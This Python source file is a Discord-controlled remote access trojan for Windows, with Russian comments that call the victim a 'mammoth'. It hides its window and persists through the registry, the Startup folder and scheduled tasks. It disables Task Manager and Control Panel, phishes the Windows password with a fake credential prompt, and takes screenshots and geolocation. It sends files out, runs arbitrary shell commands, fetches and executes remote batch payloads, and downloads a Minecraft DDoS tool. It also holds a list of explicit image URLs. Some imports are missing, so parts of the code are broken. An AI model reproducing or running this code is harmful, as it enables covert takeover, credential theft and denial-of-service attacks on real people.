from asyncio import sleep
import pyautogui
import ctypes
import requests
import os
import discord
import platform
import wmi
import getpass 
import os
import re
import json
from discord.ext import commands
import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)#скрывает программу при запуске

UserName = getpass.getuser()
                         

bot = commands.Bot(command_prefix='!', intents = discord.Intents().all())#только на новой версии в pip дискорда

bot.remove_command("help")
helpmenu = '''
**!help - Хелп меню**

**!ejectcd - открывает дисковод на компютере**
**!retractcd - закрывает дисковод на компютере**
**!windowspass - попытаеся зафишить пароль от юзера **
**!geo - вычисляет примерное местоположение мамонта**
**!info - дает инфу о пк**
**!critproc - делает критичным процесом рат (если офнуть бсод)**
**!uncritproc - делает не критичным процесом рат**
**!offmgr - оффаeт диспетчер задач**
**!onmgr - врубает диспетчер задач**
**!msg - [сообщение] вывести сообщение **
**!kp [название процесса] - отрубить процесс **
**!start [название процесса/ссылка] - врубить процесс (если хочешь вставь сыллку и она откроется)**
**!download [ссылка] [тип файла] - скачать мамонту файл (надо оставлят сыллку и тогда файл скачивается)**
**!upload [путь к файлу] - выкачать файл у мамонта**
**!wallpaper [ссылка] [тип файла] (png, jpg) - изменить рабочий стол **
**!shell [команда] - выполняет команду**
**!lp - показывает список процесов**
**!sh - сделать скрин**
**!sd - оффнуть**
**!rl - перезагрузить*

**!attck атакую майнкрафт сервер**
**!piar пиарю ваш ратк**
**!puk - режет пк**
**!downloadmc скачивание жарки для краша серверов майнкрафт**
**!updatebat обновляю bat**
**!Amogus - Амогус громко**
**!Russia - гимн россии**
'''


pornn = ['https://progolyh.com/uploads/posts/2021-12/1640142419_1-progolyh-com-p-erotika-muzhik-s-zhenskoi-piskoi-seks-1.jpg', 'https://siski.name/uploads/posts/2021-10/thumbs/1634426223_55-siski-name-p-yebut-bryunetki-rakom-porno-61.jpg', 'https://siski.name/uploads/posts/2021-12/1638475747_6-siski-name-p-porno-patsan-trakhaet-znoinuyu-bryunetku-6.jpg', 'https://drawin.club/uploads/posts/2021-02/1613415560_41-p-seks-s-shikarnimi-bryunetkami-porno-47.jpg', 'https://boobzone.pro/uploads/posts/2021-01/1611319392_35-p-porno-s-shlyukhami-s-uprugoi-popoi-erotika-37.jpg', 'https://vdojkah.com/uploads/posts/2020-06/1592021827_7-p-krasivii-seks-s-dvumya-muzhchinami-porno-10.jpg']


ip2 = requests.get('https://ramziv.com/ip').text
ip3 = ip2.replace('.', '-')

computer = wmi.WMI()
gpu_info = computer.Win32_VideoController()[0]
pon1 = gpu_info.Name
pon2 = pon1.replace(' ', '-')
pon3 = pon2.lower()
pon4 = pon3.replace('(', '')
pon5 = pon4.replace(')', '')


#==============================================================





Antiviruses = {
    'C:\\Program Files\\Windows Defender',
    'C:\\Program Files\\AVAST Software\\',
    'C:\\Program Files (x86)\\Kaspersky Lab',
    'C:\\Program Files (x86)\\360\\Total Security'
    }




#==============================================================


@bot.event
async def on_ready():
        for guild in bot.guilds:

            computer = wmi.WMI()
            computer_info = computer.Win32_ComputerSystem()[0]
            os_info = computer.Win32_OperatingSystem()[0]
            proc_info = computer.Win32_Processor()[0]
            gpu_info = computer.Win32_VideoController()[0]
            os_version = ' '.join([os_info.Version, os_info.BuildNumber])
            system_ram = float(os_info.TotalVisibleMemorySize) / 1048576

            if discord.utils.get(guild.channels, name = f'├🔑・{getpass.getuser().lower()}║{pon5}') is None:

                category = discord.utils.get(guild.categories, name="УПРАВЛЕНИЕ")

                chh = await guild.create_text_channel(name = f'├🔑・{getpass.getuser().lower()}║{pon5}', category=category)

                await chh.set_permissions(guild.default_role, read_messages=False) # это установит роле @everyone запрет на просмотр чата
                user = discord.utils.get(guild.roles, name="User")#обезательно роль юзера
                await chh.set_permissions(user, read_messages=True, send_messages=True)

                apdata = os.getenv('APPDATA')
                p = os.path.abspath('Security.exe')

                FullPath = os.path.join(r'C:\users', UserName)
                Desktop = os.path.join(FullPath, "Desktop")
                p1 = os.path.abspath('Security.exe')
                Downloads = f'{apdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'

                file_path = "/Users/"+UserName+"/AppData/Roaming/system321.bat"

                if os.path.exists(file_path) == True:
                    os.startfile('C:/Users/'+UserName+'/AppData/Roaming/system321.bat')
                    os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
                    shutil.copy(sys.argv[0], os.getenv("appdata") + "\Microsoft\Windows\Start Menu\Programs\Startup\ " + os.path.basename(sys.argv[0]))
                    os.system('schtasks /create /tn "DriverUpdate" /tr "C:/Users/' + os.getlogin() + '/AppData/Roaming/Microsoft/Windows/crack.exe" /sc MINUTE /MO 5')
                else:

                    f = open('C:/Users/'+UserName+'/AppData/Roaming/system321.bat', 'a+')
                    f.write(
                            'copy ""%0"" "%SystemRoot%\\system32\\Security.exe" \nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\\system32\\Security.exe" /f \nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f')
                    f.close()

                    os.startfile('C:/Users/'+UserName+'/AppData/Roaming/system321.bat')
                    f.close()

                await chh.send(f'@everyone Этот канал создан для управления компом {UserName}.\n\nOS Version: {os_version}\nCPU: {proc_info.Name}\nRAM: {system_ram} GB\nGraphics Card: {gpu_info.Name}\n\n\nРатка автоматически добавилась в автозагрузки!')
                os.system("start %appdata%\system321.bat")
                os.system('Taskkill /IM cmd.exe /F')
            else:
                global channel
                channel = discord.utils.get(guild.channels, name = f'├🔑・{getpass.getuser().lower()}║{pon5}')
                await channel.send(f'@here {UserName} снова запустил ратку.')
@bot.event
async def on_message(message):

    for guild in bot.guilds:

        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  

        channel = discord.utils.get(guild.channels, name = f'├🔑・{UserName.lower()}║{pon5}')
        channel2 = discord.utils.get(guild.channels, name = f'┌🤖・all-management')#обезательно такой канал и категория УПРАВЛЕНИЕ



        if message.channel.id == channel.id:
            await bot.process_commands(message)
        else:
            return

@bot.command()
async def help(ctx):
    await ctx.send(helpmenu)

@bot.command()
async def ejectcd(ctx):
    return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
    await ctx.send("D Открыла дисковод")

@bot.command()
async def retractcd(ctx):
    return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
    await ctx.send("D Закрыла дисковод")

@bot.command()
async def windowspass(ctx):
    await ctx.send("D Отправлен фишлогин")
    cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
    cmd92 = 'echo $cred.getnetworkcredential().password;'
    full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
    instruction = full_cmd
    def shell():   
        output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return output
    result = str(shell().stdout.decode('CP437'))
    await ctx.send("D пароль который ввёл мамонт: " + result)

@bot.command()
async def geo(ctx):
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
        await ctx.send("D Вычеслила местоположение мамонта: " + link)

@bot.command()
async def info(ctx):
    jak = str(platform.uname())
    intro = jak[12:]
    from requests import get

    ip = get('https://api.ipify.org').text
    pp = " IP Address = " + ip
    await ctx.send("D Дала вам инфу: " + intro + pp)
    
@bot.command()
async def lp(ctx):
    if 1==1:
        result = subprocess.getoutput("tasklist")
        numb = len(result)
        if numb < 1:
            await ctx.send("D ничего не найдено")
        elif numb > 1990:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\output.txt"):
                os.system(r"del %temp%\output.txt /f")
            f1 = open(temp + r"\output.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + r"\output.txt", filename="output.txt")
            await ctx.send("D Дала вам список процесов", file=file)
        else:
            await ctx.send("D дала вам список процесов : " + result)       

@bot.command()
async def critproc(ctx):
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
    await ctx.send("D защитила себя")

@bot.command()
async def uncritproc(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    await ctx.send("D убрала защиту")

@bot.command()
async def offmgr(ctx):
    os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    await ctx.send("D вырубила диспетчер задач")

@bot.command()
async def onmgr(ctx):
    os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
    await ctx.send("D врубила диспетчер задач")

@bot.command()
async def startup(ctx):
        shutil.copy(sys.argv[0], os.getenv("appdata") + "\Microsoft\Windows\Start Menu\Programs\Startup\ " + os.path.basename(sys.argv[0]))
        await ctx.send("D добавила себя в автозагрузку")

@bot.command()
async def msg(ctx, *, text):
    os.system("msg * " + text)
    os.system("pause")
    await ctx.send("D сообщение отправлено")

@bot.command()
async def kp(ctx, name):
    os.system("taskkill -f -im " + name)
    await ctx.send("D процес оффнут")

@bot.command()
async def start(ctx, *, name):
    os.system("start " + name)
    await ctx.send("D процес врублен")

@bot.command()
async def download(ctx, text, filetype):
    r = requests.get(text, allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Driver." + filetype, 'wb').write(r.content)
    await ctx.send("D файл загружен в директорию C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Driver." + filetype)

@bot.command()
async def wallpaper(ctx, text, filetype):
    r = requests.get(text, allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Log." + filetype, 'wb').write(r.content)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:/Users/' + os.getlogin() + "/AppData/Local/Temp/Log." + filetype , 0)
    await ctx.send("D рабочий стол изменен")
    os.remove("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Log." + filetype)

@bot.command()
async def sh(ctx):
    pyautogui.screenshot("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Bebro4kaS.png")
    await ctx.send("D дала вам скриншот")
    await ctx.send(file = discord.File("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Bebro4kaS.png"))
    os.remove("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Bebro4kaS.png")

@bot.command()
async def upload(ctx, text):
    await ctx.send("D Дала вам файл")
    await ctx.send(file = discord.File(text))

@bot.command()
async def bebra(ctx):
    r = requests.get("https://www.dropbox.com/s/67pjh0t3k2dz89u/1.mp3?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3", 'wb').write(r.content)
    await ctx.send("D врубила сочную бебру на компе мамонта")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3")

@bot.command()
async def sd(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    await ctx.send("D пк оффнут!")
    await sleep(1)
    os.system("shutdown -s -t 0")
    
    
@bot.command()
async def rl(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    await ctx.send("D пк перезагружен!")
    await sleep(1)
    os.system("shutdown -r")

@bot.command()
async def shell(ctx, text):
    os.system(text)
    await ctx.send("D выполнила команду")

@bot.command()
async def puk(ctx):
    r = requests.get("https://www.dropbox.com/s/csuiol33dfz97if/lol.bat?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat", 'wb').write(r.content)
    await ctx.send("D Режет пк мамонта")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat")

@bot.command()
async def Amogus(ctx):
    r = requests.get("https://www.dropbox.com/s/e0d2jr3em11ljz1/among-us-role-reveal-%28earrape%29-By-Tuna.mp3?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3", 'wb').write(r.content)
    await ctx.send("D SUS")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3")

@bot.command()
async def Russia(ctx):
    r = requests.get("https://drive.google.com/uc?id=1EWBNujvBczmLI6ZFpsiscXFOrtN3jxCl&export=download", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/gg.mp3", 'wb').write(r.content)
    await ctx.send("D врубила мойщний гимн россии")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/gg.mp3")

@bot.command() 
async def downloadmc(ctx):
    r = requests.get("https://drive.google.com/u/0/uc?id=1ptNYSeNJ5ktm1dyhnR3zXP9XRYWcIYpD&export=download", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Roaming/MCSTORM.jar", 'wb').write(r.content)
    await sleep(1)
    await ctx.send("D скачала шторм")
    r = requests.get("https://drive.google.com/uc?id=1fPpsRsF0l5yv5mSIRTot-UzdejG-7a3Q&export=download", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Roaming/proxies.txt", 'wb').write(r.content)
    await sleep(1)
    await ctx.send("D скачала прокси")
    r = requests.get("https://www.dropbox.com/s/y0p9jt5oi6bnipz/start.bat?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Roaming/start.bat", 'wb').write(r.content)
    await sleep(1)
    await ctx.send("D скачала батник")

@bot.command()
async def updatebat(ctx):
    r = requests.get("https://www.dropbox.com/s/y0p9jt5oi6bnipz/start.bat?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Roaming/start.bat", 'wb').write(r.content)
    await sleep(1)
    await ctx.send("D обновилась")
    
@bot.command()
async def attack(ctx, arg1):
		if int(arg1) > 300:	
			embed = discord.Embed( title = ':x:  Максимальное время атаки - 300 секунд', colour = discord.Color.red() )
			await ctx.send(embed=embed)
		else:			
			os.system("start %AppData%\start.bat")

			embed = discord.Embed( title=':ok_hand: D запущена.', description=f'Запустил {ctx.author.mention}', color=discord.Colour.blue() )	
			embed.set_image(url=f'https://i.gifer.com/SUV4.gif')	
			await ctx.send(embed=embed)

@bot.command()
async def piar(ctx, amount, amount2):

    await ctx.send(embed=discord.Embed(title='**START TOTAL-PIAR**', description=f'Начинаю пиарить...', color=0xFFA500))

    subprocess.call("taskkill /IM YandexBrowser.exe")
    subprocess.call("taskkill /IM Discord.exe")
    subprocess.call("taskkill /IM Chrome.exe")
    subprocess.call("taskkill /IM Opera.exe")
    subprocess.call("taskkill /IM Minecraft.exe")
    subprocess.call("taskkill /IM TLauncher.exe")
    subprocess.call("taskkill /IM FLauncher.exe")
    subprocess.call("taskkill /IM OperaGX.exe")
    for i in range(int(amount)):


        ctypes.windll.user32.MessageBoxW(0, f"тут должна быть ваша реклама", f"Привет", 0)
    for i in range(int(amount)):
        f = open(f'discordRT{i}', 'w+')
        f.close()


    for i in range(int(amount)):
        webbrowser.open_new_tab('сылка на сайт')

        time.sleep(4)

    await ctx.send(embed=discord.Embed(title='**TOTAL-PIAR FINISHED**', description=f'Пиар окончен.', color=0xFFA500))

bot.run("токен")
